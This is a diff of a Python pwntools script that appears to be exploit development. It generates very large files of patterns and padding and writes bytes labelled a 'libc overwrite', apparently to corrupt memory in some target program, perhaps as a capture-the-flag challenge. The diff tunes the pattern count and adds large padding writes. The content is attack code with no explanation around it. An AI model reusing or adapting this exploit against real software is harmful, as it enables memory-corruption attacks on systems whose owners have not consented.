@@ -4,7 +4,7 @@ import sys
 from pwn import *
 import time
 
-NUM_PATTERNS = (1<<27) + 2085405
+NUM_PATTERNS = (1<<27) # + 2085409
 longstr = b'y'*1090519038 # b'y'*2186534896
 
 start = time.time()
@@ -22,6 +22,9 @@ for i in range(NUM_PATTERNS-4):
     if i%1000000 == 0:
         print(f"{i}/{NUM_PATTERNS}")
 
+for i in range(120):
+    file.write(b'a'*(1<<17)+b'\n')
+file.write(b'a'*((1<<18)+(1<<17) + 50000 + 0x2000)+b'\n')
 # file.write(longstr)
 file.write(b'AAAA') # libc overwrite
 file.write(b'\n')
